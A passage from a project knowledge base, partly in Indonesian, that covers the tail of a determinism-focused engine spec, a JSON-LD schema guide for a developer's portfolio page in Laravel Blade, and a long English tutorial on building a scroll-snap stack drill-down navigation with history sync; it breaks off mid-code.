- perubahan hanya melalui pipeline

### Archive:

- write-only
- tidak boleh jadi sumber logika aktif

---

## 🚫 ANTI-SCOPE INTERNAL

Jika sistem mulai mengarah ke:

- adaptive learning
- heuristic decision making
- context guessing
- self-modifying logic tanpa kontrol

→ **HARUS DIHENTIKAN**

---

## 🧭 ENGINE CONSTRAINT

### NexusEngine:

- hanya orchestrator
- tidak boleh mengandung business logic berat

### Module:

- harus pure function oriented
- reusable
- testable

---

## 🧨 FAILURE CONDITION

Internal Core dianggap gagal jika:

- hasil tidak deterministik
- pipeline tidak bisa direplay dengan hasil sama
- state tidak bisa direkonstruksi
- terjadi side-effect antar stage
- logika tidak bisa dijelaskan secara eksplisit

---

## 🏁 FINAL STATE (INTERNAL)

Internal Core dianggap selesai jika:

- pipeline lifecycle stabil
- semua stage deterministic
- state fully traceable
- tidak ada dependency eksternal selain input/output

---

## 🔚 FINAL RULE

> Jika sebuah perubahan menambah “kecerdasan” tapi mengurangi determinisme,
> maka perubahan tersebut **HARUS DITOLAK**.

---


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [database, ui-ux, vcs]

### 📘 KNOWLEDGE: NEXUS_PORTOFOLIO SCHEMA.MD

# Portfolio Schema — faisalyusra.my.id/portfolio
> **VERSION**: v1 | **Last Updated**: 26/05/2026



> JSON-LD tambahan untuk halaman `/portfolio`
> Di-inject via `@push('schemas')` di `portfolio.blade.php`
> Merujuk `@id` yang sudah ada di `layout/app.blade.php`

---

## Cara Pakai

Taruh di bagian **bawah** file `resources/views/portfolio.blade.php` (atau nama view portofoliomu):

```blade
@push('schemas')
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@graph": [
    {
      "@type": "CollectionPage",
      "@id": "https://faisalyusra.my.id/portfolio#webpage",
      "url": "https://faisalyusra.my.id/portfolio",
      "name": "Portofolio | Faisal Yusra — Web Developer Bukittinggi",
      "description": "Kumpulan proyek web application, IT support, dan solusi digital yang telah dikerjakan untuk UMKM dan bisnis di Bukittinggi dan Sumatera Barat.",
      "publisher": {
        "@id": "https://faisalyusra.my.id/#service"
      },
      "author": {
        "@id": "https://faisalyusra.my.id/#person"
      },
      "inLanguage": "id-ID"
    },
    {
      "@type": "ItemList",
      "@id": "https://faisalyusra.my.id/portfolio#list",
      "name": "Proyek Portofolio Faisal Yusra",
      "description": "Daftar proyek web application dan solusi digital untuk UMKM.",
      "url": "https://faisalyusra.my.id/portfolio",
      "author": {
        "@id": "https://faisalyusra.my.id/#person"
      },
      "itemListElement": [
        {
          "@type": "ListItem",
          "position": 1,
          "item": {
            "@type": "CreativeWork",
            "name": "Nama Proyek 1",
            "description": "Deskripsi singkat proyek — apa yang dibangun, untuk siapa, teknologi apa.",
            "url": "https://faisalyusra.my.id/portfolio#proyek-1",
            "image": "https://faisalyusra.my.id/img/portfolio/proyek-1.webp",
            "dateCreated": "2024-01-01",
            "author": {
              "@id": "https://faisalyusra.my.id/#person"
            },
            "keywords": ["Laravel", "Livewire", "UMKM", "Web App"],
            "programmingLanguage": "PHP"
          }
        },
        {
          "@type": "ListItem",
          "position": 2,
          "item": {
            "@type": "CreativeWork",
            "name": "Nama Proyek 2",
            "description": "Deskripsi singkat proyek — apa yang dibangun, untuk siapa, teknologi apa.",
            "url": "https://faisalyusra.my.id/portfolio#proyek-2",
            "image": "https://faisalyusra.my.id/img/portfolio/proyek-2.webp",
            "dateCreated": "2024-06-01",
            "author": {
              "@id": "https://faisalyusra.my.id/#person"
            },
            "keywords": ["Filament", "Tailwind CSS", "Dashboard"],
            "programmingLanguage": "PHP"
          }
        }
      ]
    }
  ]
}
</script>
@endpush
```

---

## Kalau Portofolio Dinamis dari DB (Direkomendasikan)

Kalau data proyek disimpan di database, gunakan versi blade dinamis ini:

```blade
@push('schemas')
@php
    $listItems = $portfolios->map(function ($item, $index) {
        return [
            '@type' => 'ListItem',
            'position' => $index + 1,
            'item' => [
                '@type' => 'CreativeWork',
                'name' => $item->title,
                'description' => $item->excerpt ?? $item->description,
                'url' => url('/portfolio/' . $item->slug),
                'image' => asset('img/portfolio/' . $item->image),
                'dateCreated' => $item->created_at->format('Y-m-d'),
                'author' => ['@id' => 'https://faisalyusra.my.id/#person'],
                'keywords' => is_array($item->tags) ? $item->tags : explode(',', $item->tags),
                'programmingLanguage' => 'PHP',
            ],
        ];
    })->toArray();

    $portfolioSchema = [
        '@context' => 'https://schema.org',
        '@graph' => [
            [
                '@type' => 'CollectionPage',
                '@id' => 'https://faisalyusra.my.id/portfolio#webpage',
                'url' => 'https://faisalyusra.my.id/portfolio',
                'name' => 'Portofolio | Faisal Yusra — Web Developer Bukittinggi',
                'description' => 'Kumpulan proyek web application, IT support, dan solusi digital yang telah dikerjakan untuk UMKM dan bisnis di Bukittinggi dan Sumatera Barat.',
                'publisher' => ['@id' => 'https://faisalyusra.my.id/#service'],
                'author' => ['@id' => 'https://faisalyusra.my.id/#person'],
                'inLanguage' => 'id-ID',
            ],
            [
                '@type' => 'ItemList',
                '@id' => 'https://faisalyusra.my.id/portfolio#list',
                'name' => 'Proyek Portofolio Faisal Yusra',
                'description' => 'Daftar proyek web application dan solusi digital untuk UMKM.',
                'url' => 'https://faisalyusra.my.id/portfolio',
                'author' => ['@id' => 'https://faisalyusra.my.id/#person'],
                'itemListElement' => $listItems,
            ],
        ],
    ];

    echo '<script type="application/ld+json">'
        . json_encode($portfolioSchema, JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT)
        . '</script>';
@endphp
@endpush
```

---

## Penjelasan Tiap Schema

| Schema           | Fungsi                                                             |
| ---------------- | ------------------------------------------------------------------ |
| `CollectionPage` | Memberitahu AI bahwa `/portfolio` adalah halaman kumpulan karya    |
| `ItemList`       | Mendaftarkan semua proyek sebagai list yang terstruktur            |
| `CreativeWork`   | Tiap proyek dikenali sebagai karya kreatif/teknis                  |
| `@id` (linked)   | Menghubungkan ke `#person` dan `#service` yang sudah ada di layout |

---

## Koneksi ke Schema yang Sudah Ada di `app.blade.php`

```
layout/app.blade.php
│
├── Person Schema          → @id: #person       (Muhammad Faisal Alyusra)
├── ProfessionalService    → @id: #service       (Faisal Yusra Digital)
└── WebPage Schema         → @id: [current]#webpage
        ↑
        │   @push('schemas') dari portfolio.blade.php
        │
        ├── CollectionPage → publisher: #service, author: #person
        └── ItemList       → author: #person
                └── CreativeWork (tiap proyek)
```

> **Tidak perlu redeclare** `Person` dan `ProfessionalService` di sini —
> cukup referensikan via `"@id"` karena sudah ada di `@graph` global.

---

## Test & Validasi

Setelah deploy, validasi di:

- **Schema.org Validator** → https://validator.schema.org
- **Google Rich Results Test** → https://search.google.com/test/rich-results
- **Paste URL** → `https://faisalyusra.my.id/portfolio`

---

_Dibuat berdasarkan pola `layout/app.blade.php` · Mei 2026_


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [database, ui-ux, vcs]

### 📘 KNOWLEDGE: NEXUS_STACK-DRILL-DOWN.MD

# Stack Drill Down
> **VERSION**: v1 | **Last Updated**: 26/05/2026



## Overview

A stack drill-down is a hierarchical navigation pattern, common in mobile apps, where activating a link pushes a new full-screen view on top of the previous one. The view's content is application-defined — a settings sub-page, a thread inside a feed, a folder inside a file browser, a detail page inside a gallery, etc. The user returns by swiping the current view off-screen to the right or by tapping a back button. Browser history stays in sync so the OS-level Back gesture, deep links, and forward/back navigation all work coherently.

This guide implements the stack as:

- A horizontal CSS scroll-snap container where each view is exactly one snap stop. Drilling down appends a new view and smooth-scrolls to it; the swipe-back gesture is handled natively by the browser, giving momentum, velocity, and interruption tracking for free with no pointer-event JavaScript.
- A `scrollsnapchange` event listener on the stack that fires when the snap target changes. This is used as the single source of truth for "the active view changed" — so swipe, click, programmatic scroll, and `popstate` paths all converge in one callback that updates `inert`, restores focus, prunes views the user swiped past, and reconciles browser history.
- A `pushState` / `popstate` integration so every drill-down adds a history entry, the OS-level Back gesture works, and deep links open directly into the right view.
- An (optional) scroll-driven `view()` animation on each view that produces a parallax + dim + shadow effect tied directly to the swipe gesture, so the visible motion is driven by the user's finger, not a tween.

This approach is preferred over JavaScript-driven `transform` animations because the snap mechanism gives the user direct gestural control of the panel's position (their finger drives it, not a tween) and matches the interaction patterns users expect from native mobile apps.

## Implementation

### 1. Markup

The static HTML is just an empty stack container; views are built in JavaScript and appended as the user navigates.

```html
<div class="Stack">
  <!-- Intentionally empty. The initial view is appended by JavaScript
       at init time (step 8). -->
</div>
```

Each view is a `.Stack-view` direct child of `.Stack` (the snap target) with a `.Stack-viewContent` wrapper inside it (where view content lives, and where the parallax transform applies — see step 2). At any moment the stack has one view per active history entry, left-to-right in drill-down order. After the user has drilled in two levels from the root the rendered DOM looks like this:

```html
<div class="Stack">
  <!-- Root view. Has whatever content makes sense as the entry point
       of this section of the app. No back button — there is nothing
       behind the root in the stack. -->
  <div class="Stack-view" inert>
    <div class="Stack-viewContent">
      <!-- Root content; includes <a href> links that drill in. -->
    </div>
  </div>

  <!-- First-level drill-down view. The user got here by activating a
       link in the root view. -->
  <div class="Stack-view" inert>
    <div class="Stack-viewContent">
      <header>
        <!-- DO include a back button. The swipe gesture only works on
             touch — keyboard and pointer users need an explicit control. -->
        <button class="back" aria-label="Back"></button>
        <!-- Title / breadcrumb / etc. -->
      </header>
      <main>
        <!-- View content; may include further drill-down <a href> links. -->
      </main>
    </div>
  </div>

  <!-- Second-level drill-down view. Currently visible — no `inert`
       attribute. Same shape as the first-level view. -->
  <div class="Stack-view">
    <div class="Stack-viewContent">
      <header>
        <button class="back" aria-label="Back"></button>
        <!-- ... -->
      </header>
      <main><!-- ... --></main>
    </div>
  </div>
</div>
```

Notes:

- All views except the currently-visible one carry the `inert` attribute. This is applied/removed automatically by the `scrollsnapchange` handler in step 7 — do not set it from your view builders.
- Views the user swipes back past are removed from the DOM (also by step 7) so the stack never grows beyond `currentDepth + 1` children. They are rebuilt on demand from their cached URL paths if forward navigation returns to them.

### 2. Styles

#### The stack scroller

The stack is a horizontal grid where each child view is exactly the width of the container, with CSS scroll-snap enforcing one-view-per-snap. This is what gives the swipe-back gesture its native feel.

```css
.Stack {
  /* Use dvh so the height tracks the dynamic viewport on mobile, where
     the address bar can show/hide. svh would clip during the address bar
     animation; vh leaks under it. */
  height: 100dvh;

  /* Lay views out left-to-right, each one full-width, so horizontal
     scrolling moves between them one at a time. */
  display: grid;
  grid-auto-flow: column;
  grid-auto-columns: 100%;
  grid-template-rows: 100%;
  overflow-x: auto;

  /* `mandatory` guarantees the stack always settles fully on a view —
     never half-way between two. */
  scroll-snap-type: x mandatory;
  /* Prevent the swipe-back gesture from chaining into the browser's
     own history-back gesture (iOS, some Android) or the page's vertical
     scroll. The user is navigating the stack, not the page. */
  overscroll-behavior-x: none;
}

/* Hide the visual scrollbar — the snap and the parallax are the
   affordances; a horizontal scrollbar would look out of place. */
.Stack::-webkit-scrollbar {
  display: none;
}

/* MANDATORY: Opt into smooth programmatic scrolling via CSS, gated on
   prefers-reduced-motion. JS code calls scrollTo/scrollBy with
   behavior: 'auto' which defers to this rule, so the OS-level reduced-
   motion preference automatically downgrades to instant scrolling
   without any per-call JS branching. */
@media (prefers-reduced-motion: no-preference) {
  .Stack {
    scroll-behavior: smooth;
  }
}

.Stack-view {
  scroll-snap-align: start;
  /* `always` prevents the user from blowing through more than one view
     per gesture, so depth changes always happen one step at a time. */
  scroll-snap-stop: always;
}

/* MANDATORY: A separate inner element is required for the parallax
   transform below. Applying transforms directly to the snap target
   (.Stack-view) would feed back into the scroll container's snap
   geometry and the scroller would jump mid-gesture. */
.Stack-viewContent {
  width: 100%;
  height: 100%;
  background-color: #fff;
  /* Each view scrolls its own content vertically, independent of the
     stack's horizontal scroll. */
  overflow-y: auto;
}
```

#### The "stack" effect (parallax / dim / shadow)

A scroll-driven `view(inline)` animation tracks each view's progress through the stack scroller and applies a parallax + dim to the exiting view, plus a shadow on incoming drill-down views so they read as "cards" stacking over the previous view.

```css
/* MANDATORY: Wrap the animation block in @supports. Browsers without
   scroll-driven animations still parse the @keyframes and would
   apply the `to` state as a static style, leaving every view
   permanently transformed. The @supports gate confines the animation
   to browsers where it actually animates. */
@supports (animation-timeline: view()) {
  .Stack-viewContent {
    /* view(inline) tracks this element's progress through its nearest
       scrollable ancestor on the inline (x) axis. */
    animation: parallax linear both;
    animation-timeline: view(inline);
    /* Only animate the EXIT phase — when this view is being covered
       by a deeper one. During its own entry the view stays at rest,
       so the fresh content is fully bright and in position throughout. */
    animation-range: exit 0% exit 100%;
  }

  /* Drill-down views (everything except the root) also get a shadow on
     their left edge during the transition so they feel like cards
     stacking over the previous view. */
  .Stack-view:not(:first-child) .Stack-viewContent {
    animation: parallax linear both, shadow-fade linear both;
    animation-timeline: view(inline), view(inline);
    /* parallax: only exit (the view sliding back as a deeper one comes in).
       shadow-fade: entry through exit (visible the whole time the view is
       transitioning, not when it's at rest). */
    animation-range: exit 0% exit 100%, entry 0% exit 100%;
  }

  @keyframes parallax {
    /* translateX(75%) and brightness(0.8) are examples — adjust to taste. */
    to {
      transform: translateX(75%);
      filter: brightness(0.8);
    }
  }

  @keyframes shadow-fade {
    /* Shadow ramps in during entry, holds across the middle of the
       gesture, and ramps out during exit — so it's only visible while
       the view is mid-transition, not when at rest. */
    0%, 100% { box-shadow: 0 0 1.5rem #0000; }
    25%, 75% { box-shadow: 0 0 1.5rem #0004; }
  }
}
```

NOTE: This effect is popular in modern native stack applications and is a good starting point, but the exact visual effects can be customized to fit existing transition styles as needed.

### 3. Module state

The stack tracks four pieces of state in module scope:

```js
const stack = document.querySelector('.Stack');

// Reference to the root view DOM element. The Stack starts empty, so
// this is null until the root view is created — either at init (step 8,
// when the URL is '/') or later by synthesizeRootEntry() (when the user
// landed on a deep link and then navigates back). Held as a mutable
// reference because other code (the scrollsnapchange handler, init, etc.)
// uses identity comparisons against it.
let rootView = null;

// Tracks which element to restore focus to when the user swipes back
// into a previous view. Keyed by the view element itself so entries
// are garbage-collected automatically when the view is pruned.
const returnFocus = new WeakMap();

// Maps history depth -> {urlPath, view}. We MUST maintain this map
// ourselves because the History API does not expose state for entries
// other than the current one — so when a view is pruned on swipe-back,
// we still need to remember which URL it represented in case the user
// later forward-navigates back into it.
const entriesByDepth = new Map();

// Tracked manually because history.state on a popstate event tells us
// the destination depth but not where we came from. We need both to
// compute the direction (back vs forward) and the distance.
let currentDepth = 0;
```

Plus three application-specific helpers — the only places where your app's routing and view rendering plug in:

```js
// Resolve a URL path to the data your app needs to render the
// corresponding drill-down view, or return null for paths this section
// of the app does not handle (the root path '/', external links,
// unknown routes). resolveUrl() is for drill-down routes only — the
// root view is rendered separately by createRootView() below.
function resolveUrl(urlPath) {
  // Replace with your routing logic. For example, match `/view/:id`
  // and look the id up in your app state.
}

// Build the root (home) view of the stack. Application-specific content;
// preserve the .Stack-view / .Stack-viewContent wrapper structure (the
// inner element is required for the parallax — see step 2) and DO NOT
// render a back button — the root view has nothing behind it in the
// stack.
function createRootView() {
  const view = document.createElement('div');
  view.className = 'Stack-view';
  view.innerHTML = `
    <div class="Stack-viewContent">
      <!-- Root content. Include <a href> elements pointing at URL paths
           that resolveUrl() accepts, to enable drill-down from here. -->
    </div>
  `;
  return view;
}

// Build a drill-down view DOM element from the resolved route data.
// Customize the inner content freely, but DO preserve the .Stack-view
// / .Stack-viewContent wrapper structure and DO include a back button
// (the swipe gesture only works on touch).
function createDrillDownView(routeData) {
  const view = document.createElement('div');
  view.className = 'Stack-view';
  view.innerHTML = `
    <div class="Stack-viewContent">
      <header>
        <button class="back" aria-label="Back"></button>
        <!-- Title, breadcrumb, or other view chrome derived from
             routeData. -->
      </header>
      <main>
        <!-- View body, also from routeData. Include further <a href>
             elements pointing at URL paths that resolveUrl() also
             accepts, to enable additional drill-downs from this view. -->
      </main>
    </div>
  `;
  return view;
}

function getCurrentUrlPath() {
  return location.pathname;
}
```

### 4. Drill down

A drill-down does four things in this order: push a history entry, build the new view, append it, smooth-scroll to it. The `scrollsnapchange` handler (step 7) picks up from there once the snap settles.

```js
function drillDown(urlPath) {
  const routeData = resolveUrl(urlPath);
  if (!routeData) return;

  const newDepth = currentDepth + 1;
  // Push BEFORE creating the view so the URL is correct if anything
  // observing history (analytics, etc.) reads it during view creation.
  history.pushState({depth: newDepth}, '', urlPath);

  // pushState truncates forward entries in real browser history;
  // mirror that truncation in our depth map so we don't hold references
  // to views the user can no longer reach.
  for (const d of entriesByDepth.keys()) {
    if (d >= newDepth) entriesByDepth.delete(d);
  }
  currentDepth = newDepth;

  const newView = createDrillDownView(routeData);
  stack.appendChild(newView);
  entriesByDepth.set(newDepth, {urlPath, view: newView});

  // Scroll one viewport-width to the right. behavior: 'auto' defers to
  // the CSS `scroll-behavior` set in step 2, which is smooth unless
  // prefers-reduced-motion is set. The snap container locks onto the
  // new view; the scrollsnapchange listener (step 7) fires when the
  // snap settles.
  stack.scrollBy({left: stack.clientWidth, behavior: 'auto'});
}
```

### 5. Click and back-button handling

Intercept link clicks inside the stack and convert them to drill-downs. Preserve modifier-key behavior so cmd/middle-click still opens the link in a new tab.

```js
stack.addEventListener('click', (e) => {
  // Back button: defer to goBack() (defined below), which handles both
  // the normal in-app case and the deep-link case.
  if (e.target.closest('.back')) {
    goBack();
    return;
  }

  // Drill-down link.
  const link = e.target.closest('a');
  if (!link || !stack.contains(link)) return;
  // Let the browser handle modified clicks so users can open links
  // in new tabs / windows. e.button !== 0 filters out middle-clicks.
  if (e.metaKey || e.ctrlKey || e.shiftKey || e.button !== 0) return;

  const urlPath = new URL(link.href).pathname;
  const parentView = link.closest('.Stack-view');
  // If the URL isn't handled by this section of the app (resolveUrl
  // returns null), fall through so the browser navigates normally.
  if (!resolveUrl(urlPath) || !parentView) return;

  e.preventDefault();
  // Record which link the user activated so focus can be restored to
  // it when they swipe (or click) back into this view.
  returnFocus.set(parentView, link);
  drillDown(urlPath);
});

// Going back is usually just history.back(), but there's an important
// edge case: when the user lands directly on a deep-linked URL, there
// is no in-app history entry behind it. Calling history.back() in that
// situation would take them out of the app entirely. MANDATORY: detect
// this case and synthesize a root entry instead, so an in-app Back from
// a deep link lands on the root view and the platform Back from there
// returns the user to where they came from.
function goBack() {
  const atDeepLinkRoot = currentDepth === 0
    && entriesByDepth.get(0)?.view !== rootView;
  if (atDeepLinkRoot) {
    synthesizeRootEntry();
  } else {
    // history.back() fires popstate, which routes through
    // updateFromHistoryState (step 6) and scrolls the stack — the
    // same path a swipe-back converges on.
    history.back();
  }
}

function synthesizeRootEntry() {
  // Push a new history entry pointing at the root URL. This becomes the
  // entry the user "came from"; the original deep-linked entry is now
  // behind us, so platform Back from the root view will return there.
  const newDepth = currentDepth + 1;
  history.pushState({depth: newDepth}, '', '/');

  // Create the root view if it doesn't exist yet (we landed on a deep
  // link and never needed it before now), and insert it at the LEFT end
  // of the stack. Adjust scrollLeft by one viewport width so the user's
  // view doesn't visually jump — they should still be looking at the
  // deep-linked view until the scroll animation below runs.
  if (!rootView) {
    rootView = createRootView();
    stack.prepend(rootView);
    stack.scrollLeft += stack.clientWidth;
  }
  entriesByDepth.set(newDepth, {urlPath: '/', view: rootView});

  // Now scroll to the new entry (the root view). updateFromHistoryState
  // smooth-scrolls one step left, the parallax plays, and
  // scrollsnapchange fires when the root view settles.
  updateFromHistoryState(history.state);
}
```

### 6. Sync from history (popstate)

`popstate` fires when the user uses the browser/OS back or forward button, or when JavaScript calls `history.back()` / `.go()`. This handler is the only path that scrolls the stack in response to a history change.

```js
window.addEventListener('popstate', (event) => {
  updateFromHistoryState(event.state);
});

function updateFromHistoryState(state, behaviorOverride) {
  const newDepth = state?.depth ?? 0;
  const urlPath = getCurrentUrlPath();

  // Ensure entriesByDepth has an entry for the destination depth.
  // If the URL changed (e.g. forward-nav into a previously-pruned
  // view), clear the cached view reference so the loop below rebuilds.
  const entry = entriesByDepth.get(newDepth) ?? {view: null};
  if (entry.urlPath !== urlPath) {
    entry.urlPath = urlPath;
    entry.view = urlPath === '/' ? rootView : null;
  }
  entriesByDepth.set(newDepth, entry);

  // Rebuild any views between root and the destination that were
  // pruned earlier (when the user swiped back past them). Without
  // this, forward-navigating to a previously-pruned view would have
  // no element to scroll to.
  for (let d = 0; d <= newDepth; d++) {
    const e = entriesByDepth.get(d);
    if (!e || e.view) continue;
    const routeData = resolveUrl(e.urlPath);
    if (!routeData) continue;
    const rebuilt = createDrillDownView(routeData);
    stack.appendChild(rebuilt);
    e.view = rebuilt;
  }

  currentDepth = newDepth;

  const targetView = entriesByDepth.get(newDepth)?.view;
  if (!targetView) return;

  // Compare destination index against current scroll position so we
  // can bail if they're already aligned. This is reached when the
  // scrollsnapchange handler below calls history.go() to sync history
  // after a swipe-back that already completed visually — there's
  // nothing more to scroll.
  const toIdx = [...stack.children].indexOf(targetView);
  const fromIdx = Math.round(stack.scrollLeft / stack.clientWidth);
  if (fromIdx === toIdx) return;

  // Pick a scroll behavior:
  //   - multi-step jumps (e.g. history.go(-3)): 'instant' to skip
  //     intermediate snap points — otherwise smooth-scrolling would
  //     fire scrollsnapchange for each one and do N rounds of
  //     state-transition work for no reason.
  //   - rightward (forward) single-step: 'instant'. Browser-forward is
  //     rare on the web and is often spurious (e.g. iOS Safari treats
  //     edge swipes as forward navigation, even with overscroll-behavior
  //     set). An instant swap reads as "snap" rather than a misleading
  //     drilldown animation the user didn't ask for. The user-initiated
  //     drill-down path (drillDown, step 4) is unaffected — it calls
  //     scrollBy directly and never reaches this code.
  //   - leftward (back) single-step: 'auto' so the CSS `scroll-behavior`
  //     (smooth unless prefers-reduced-motion is set — see step 2)
  //     applies. Back is the common, expected case and benefits from
  //     the animation.
  // NOTE: "forward" here means spatial direction (toIdx > fromIdx),
  // NOT depth direction. synthesizeRootEntry (step 5) pushes a new
  // depth but scrolls LEFT to the root view, which correctly reads as
  // back-style (smooth).
  const forward = toIdx > fromIdx;
  const multiStep = Math.abs(toIdx - fromIdx) > 1;
  const behavior = behaviorOverride ?? (forward || multiStep ? 'instant' : 'auto');
  stack.scrollTo({left: toIdx * stack.clientWidth, behavior});
}
```

### 7. `scrollsnapchange`: the single source of truth

After every snap commit — whether triggered by a swipe, a click, or a programmatic scroll — the browser fires a `scrollsnapchange` event on the scroll container, with the newly snapped element exposed as `event.snapTargetInline` (for horizontal snapping). Putting all state transitions inside this one handler is what keeps the swipe path, the click path, and the `popstate` path coherent.

The handler is extracted into a standalone `onActiveViewChanged` function so the fallback (see "Fallback strategies" below) can reuse it without duplicating the logic.

```js
function onActiveViewChanged(currentView) {
  // Walk the stack in DOM order to update each view's role:
  //  - Views at or before currentView stay in the DOM but get
  //    `inert` (except currentView) so focus, pointer events, and
  //    AT navigation cannot leak into views hidden behind the
  //    parallax.
  //  - Views after currentView are unreachable (the user swiped
  //    back past them) so we drop them from the DOM to free memory.
  //    Their urlPath stays in entriesByDepth so a later forward
  //    navigation can rebuild the view from scratch.
  let seenCurrent = false;
  for (const view of [...stack.children]) {
    if (seenCurrent) {
      for (const e of entriesByDepth.values()) {
        if (e.view === view) e.view = null;
      }
      view.remove();
    } else {
      // MANDATORY: inert non-current views. Without this, tabbing
      // and screen-reader navigation can reach content hidden behind
      // the parallax — a severe accessibility failure that's
      // invisible to sighted users.
      view.toggleAttribute('inert', view !== currentView);
      if (view === currentView) seenCurrent = true;
    }
  }

  // If the visible view's depth doesn't match `currentDepth`, the
  // user got here by swiping (not clicking) — sync history so the
  // browser back/forward buttons stay coherent with what's on screen.
  let currentViewDepth;
  for (const [d, e] of entriesByDepth) {
    if (e.view === currentView) currentViewDepth = d;
  }
  if (currentViewDepth !== undefined && currentViewDepth !== currentDepth) {
    // history.go fires popstate, which re-enters updateFromHistoryState.
    // That call's fromIdx === toIdx check bails out without scrolling.
    history.go(currentViewDepth - currentDepth);
  }

  // Restore focus on the now-active view:
  //  - If we recorded which link the user activated to drill out
  //    of this view, return focus there so a swipe-back lands them
  //    exactly where they left off.
  //  - Otherwise (a freshly-pushed drill-down view), move focus to
  //    the back button so keyboard users have an obvious next action.
  //  - preventScroll is REQUIRED: without it, .focus() scrolls the
  //    snap container to bring the focused element into view, which
  //    fights the snap and can land the user mid-snap.
  const stored = returnFocus.get(currentView);
  if (stored) {
    stored.focus({preventScroll: true});
    returnFocus.delete(currentView);
  } else if (currentView !== rootView) {
    currentView.querySelector('.back')?.focus({preventScroll: true});
  }
}

stack.addEventListener('scrollsnapchange', (event) => {
  // snapTargetInline is the element that was just snapped to on the
  // inline (horizontal) axis. For this stack — where each view is one
  // horizontal snap stop — that's the new active view.
  onActiveViewChanged(event.snapTargetInline);
});
```

### 8. Initialization (including deep links)

When the page loads, the URL may already point at a deep view (a shared link, a bookmark, a refresh on a deep page). Build whichever initial view matches the URL — root or deep-linked, but never both — append it to the empty stack, seed the depth-0 history entry, and run an initial scroll pass with `behavior: 'instant'` so the parallax doesn't animate on first paint.

```js
const initialUrlPath = getCurrentUrlPath();
const initialRouteData = resolveUrl(initialUrlPath);

// Build the initial view: a drill-down view if the URL maps to one,
// otherwise the root view. Whichever it is, that's the only view in
// the stack right now — the other will be created lazily by
// synthesizeRootEntry (step 5) or drillDown (step 4) if the user
// navigates to it.
let initialView;
if (initialRouteData) {
  initialView = createDrillDownView(initialRouteData);
} else {
  rootView = createRootView();
  initialView = rootView;
}
stack.appendChild(initialView);

entriesByDepth.set(0, {urlPath: initialUrlPath, view: initialView});
// replaceState attaches a `depth` to the entry the user landed on, so
// any subsequent pushState / popstate has a base depth to count from.
history.replaceState({depth: 0}, '');

updateFromHistoryState(history.state, 'instant');
```

### Best practices

- **DO** use the `scrollsnapchange` event (with an `IntersectionObserver` fallback — see "Fallback strategies") as the source of truth for "the active view changed", not scroll-event coordinates. Snap commit is the only event that fires consistently across swipe, click, programmatic scroll, and `popstate` paths.
- **DO** apply transforms to a child of the snap target, never to the snap target itself. A transform on the snap target feeds back into the scroll container's snap geometry and the scroller will glitch mid-gesture.
- **DO** apply `inert` to every view except the currently visible one. Without this, focus and screen-reader navigation leak into views hidden behind the parallax — invisible to sighted users but a severe accessibility failure.
- **DO** push a history entry on every drill-down and handle `popstate` so the OS-level Back gesture and the browser back/forward buttons work. This is what makes the pattern feel like a native app.
- **DO** reconcile history from the active-view-changed handler when a swipe-back lands on a view whose depth doesn't match `currentDepth`. Without this, a subsequent OS Back returns the user somewhere unexpected because the browser's history cursor is out of sync with what's on screen.
- **DO** prune views the user swiped past from the DOM. A long drill-down session can otherwise accumulate dozens of detached subtrees. The cached URL path in `entriesByDepth` is enough to rebuild any view if forward navigation returns to it.
- **DO** call `.focus({preventScroll: true})` when restoring focus inside the stack. The default `preventScroll: false` makes the browser scroll the focus target into view, which fights the snap container and can land the user mid-snap.
- **DO** preserve cmd/ctrl/middle-click on internal links so URLs remain shareable and openable in a new tab.
- **DO** use `behavior: 'instant'` for multi-step history jumps AND for spatial-forward popstate transitions (`toIdx > fromIdx`). Multi-step jumps would otherwise fire `scrollsnapchange` at every intermediate snap and do N rounds of inert/focus/history work. Forward popstates are often spurious — iOS Safari treats edge swipes as browser forward even with `overscroll-behavior-x: none` set, and an instant swap is much less misleading than animating a "drilldown" the user didn't initiate. The user-initiated drill-down path (`drillDown`) is unaffected because it scrolls directly, not via `popstate`.
- **DO** respect `prefers-reduced-motion`: declare `scroll-behavior: smooth` only inside `@media (prefers-reduced-motion: no-preference)` and call `scrollTo` / `scrollBy` with `behavior: 'auto'` (not `'smooth'`) so the OS-level preference takes effect without per-call JS branching. Hard-coding `behavior: 'smooth'` bypasses the user's setting.
- **DO** render real `<a href>` elements as drill-down triggers, not `<button onclick>` or `<div>`. Real anchors get URL preview on hover, shareability, middle-click, screen-reader role, and SEO for free.
- **DO** include an explicit back button in every drill-down view. The swipe gesture only works on touch — keyboard, pointer, and desktop users need a visible affordance.
- **DO NOT** call `history.pushState` from the `popstate` handler — that pushes *new* entries while the user is trying to go back and breaks the browser back button.
- **DO NOT** drive the parallax with a `scroll` event listener when scroll-driven animations are available. The CSS path runs on the compositor; a JS scroll listener runs on the main thread and will visibly drop frames during the gesture.
- **DO NOT** mutate views you removed from the DOM after a swipe-back. Treat `entriesByDepth` as the canonical record: a pruned entry has `view: null` and is rebuilt on demand in `updateFromHistoryState`.

### Fallback strategies

Most of the features used in this guide are Baseline Widely available, and do not require any fallback. The only features not widely available that may require fallbacks are scroll-snap-events and scroll-driven-animations, both of which have robust fallback or progressive enhancement stories, and are safe to use for this use case:

#### Scroll snap events

Scroll snap events has limited availability.
Supported by: Chrome 129 (Sep 2024) and Edge 129 (Sep 2024).
Unsupported in: Firefox and Safari.

The `scrollsnapchange` event is the cleanest way to detect "the active view changed" — one listener on the stack, fired exactly once per snap commit. In browsers without it, the same effect can be polyfilled with an `IntersectionObserver` watching each view for full visibility inside the stack. The fallback dispatches into the same `onActiveViewChanged` function the primary path uses, so all the state-transition logic stays in one place.

```js
// MANDATORY when supporting browsers that haven't shipped scroll-snap-events
// yet. Check `HTMLElement.prototype` (not `window` or `document`) — the
// event handler IDL attribute is added to the prototype when the feature
// is supported, regardless of whether any element has the handler set.
if (!('onscrollsnapchange' in HTMLElement.prototype)) {
  const viewObserver = new IntersectionObserver((entries) => {
    for (const entry of entries) {
      // threshold:1 only fires for fully-visible entries, but the
      // observer also emits a "leaving" entry per view that drops below
      // ratio 1. Filter to the entering side, which is the snap-commit
      // moment we're trying to detect.
      if (entry.intersectionRatio === 1) {
        onActiveViewChanged(entry.target);
      }
    }
  }, {root: stack, threshold: 1});

  // Auto-observe every .Stack-view as it's added to the stack, and stop
  // observing as it's removed. Using a MutationObserver lets the primary
  // code (drillDown, updateFromHistoryState, synthesizeRootEntry, init)
  // stay free of fallback wiring.
  new MutationObserver((mutations) => {
